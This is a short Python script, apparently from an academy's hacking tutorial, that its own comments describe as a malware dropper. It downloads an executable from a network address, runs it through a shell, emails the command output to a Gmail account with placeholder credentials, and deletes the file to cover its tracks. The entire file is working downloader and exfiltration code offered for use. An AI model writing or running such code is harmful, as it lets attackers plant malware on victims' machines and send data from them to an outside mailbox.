"""Program to Download a malware, Execute it and send report to your email id
Python3
Bajwa Tech Academy/Bajwa Academy
"""

import requests, subprocess, smtplib, os   # Importing the Modules


# Function to download File or malware                      # BAJWA ACADEMY
def download_file(url):
    request_response=requests.get(url)           # connection setup with specified "url" to download
    print(request_response)
    file_name = url.split("/")[-1]                # BAJWA ACADEMY
    with open(file_name,"wb") as file1:         # Block to open a file in binary write mode, write content and close it
        file1.write(request_response.content)


# function to send report or message to specified email
def email_send(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)   # BAJWA ACADEMY
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

download_file("http://192.168.91.25/sharedfolder/Malwarename.exe")  # calling the function "download_file" to download malware

# Execute command or to execute downloaded malware
result= subprocess.check_output("Malwarename.exe all",shell=True)   # BAJWA ACADEMY
email_send("youremailid","youremailidpassword",result)
os.remove("Malwarename.exe")



